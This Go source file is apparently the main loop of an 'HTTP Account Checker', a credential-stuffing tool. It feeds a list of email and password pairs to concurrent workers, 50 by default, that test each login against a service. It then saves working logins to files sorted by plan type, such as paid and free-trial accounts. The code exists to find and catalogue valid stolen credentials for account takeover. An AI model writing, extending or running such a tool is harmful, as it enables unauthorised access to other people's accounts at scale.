package main

import (
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"sync/atomic"
	"time"
)

type RunOptions struct {
	ConfigPath   string
	AccountsPath string
	ResultsDir   string
	Workers      int
}

func runChecker(opts RunOptions) (hits, fails, errors int64, err error) {
	cfg, err := LoadConfig(opts.ConfigPath)
	if err != nil {
		return 0, 0, 0, fmt.Errorf("config: %w", err)
	}

	w := cfg.Settings.Workers
	if opts.Workers > 0 {
		w = opts.Workers
	}
	if w <= 0 {
		w = 50
	}

	accounts, err := ParseAccountsFile(opts.AccountsPath)
	if err != nil {
		return 0, 0, 0, fmt.Errorf("accounts: %w", err)
	}

	checker, err := NewChecker(cfg)
	if err != nil {
		return 0, 0, 0, fmt.Errorf("checker init: %w", err)
	}

	resultsDir := opts.ResultsDir
	if resultsDir == "" {
		resultsDir = filepath.Join(exeDir(), "results")
	}
	if err := os.MkdirAll(resultsDir, 0o755); err != nil {
		return 0, 0, 0, fmt.Errorf("output dir: %w", err)
	}

	fmt.Println("============================================================")
	fmt.Printf("  HTTP Account Checker — %s\n", cfg.Name)
	fmt.Printf("  Config   : %s\n", opts.ConfigPath)
	fmt.Printf("  Accounts : %s (%d lines)\n", opts.AccountsPath, len(accounts))
	fmt.Printf("  Workers  : %d\n", w)
	fmt.Printf("  Output   : %s\n", resultsDir)
	fmt.Println("============================================================")
	fmt.Println()

	jobs := make(chan Account, w*2)
	var wg sync.WaitGroup
	var hitCount, failCount, errCount atomic.Int64
	var fileMu sync.Mutex
	start := time.Now()

	for i := 0; i < w; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for acc := range jobs {
				res := checker.Check(acc.Email, acc.Password)
				switch res.Status {
				case StatusHit:
					hitCount.Add(1)
					fmt.Println(res.ConsoleLine(cfg, true))
					fileMu.Lock()
					_ = writeResultFiles(cfg, res, resultsDir)
					fileMu.Unlock()
				case StatusFail:
					failCount.Add(1)
					fmt.Println(res.ConsoleLine(cfg, false))
					fileMu.Lock()
					_ = writeResultFiles(cfg, res, resultsDir)
					fileMu.Unlock()
				default:
					errCount.Add(1)
					fmt.Printf("[ERROR] %s | %s\n", acc.Email, res.Reason)
				}
			}
		}()
	}

	for _, acc := range accounts {
		jobs <- acc
	}
	close(jobs)
	wg.Wait()

	elapsed := time.Since(start).Round(time.Millisecond)
	fmt.Println("------------------------------------------------------------")
	fmt.Printf("Done in %s | HIT=%d FAIL=%d ERROR=%d\n", elapsed, hitCount.Load(), failCount.Load(), errCount.Load())
	fmt.Printf("Results folder:\n  %s\n", filepath.Clean(resultsDir))
	fmt.Println("  hits.txt       — valid logins + active plan")
	fmt.Println("  by_plan/       — sorted by plan (FREE_TRIAL, PRO, PAID...)")
	fmt.Println("  paid.txt       — paid plans only")
	fmt.Println("  free_trial.txt — free trial accounts")
	fmt.Println("  invalid.txt    — wrong credentials")

	return hitCount.Load(), failCount.Load(), errCount.Load(), nil
}
